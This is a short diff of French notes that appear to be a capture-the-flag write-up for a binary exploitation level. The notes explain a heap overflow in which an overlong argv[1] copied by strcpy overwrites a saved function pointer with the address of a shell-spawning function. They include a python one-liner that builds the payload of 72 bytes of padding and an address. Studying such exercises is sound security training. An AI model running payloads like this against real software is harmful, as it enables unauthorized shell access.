@@ -1,6 +1,10 @@
 tout simple celui ci
 
 on voit une fonction n qui call un shell
-on overflow le strcpy pour ecraser l'eip par l'adresse de n blablabla on connait
+il save l'adresse de m 
+il strcpy av[1] dans un malloc de 64 puis il call l'adresse qui est save dans le premier malloc
+en mettant un trop grand ARGV on ecrase le premier malloc et on met l'adresse de n
+
+
 
 python -c "print 'a'*72 + '\x54\x84\x04\x08'" > /tmp/6
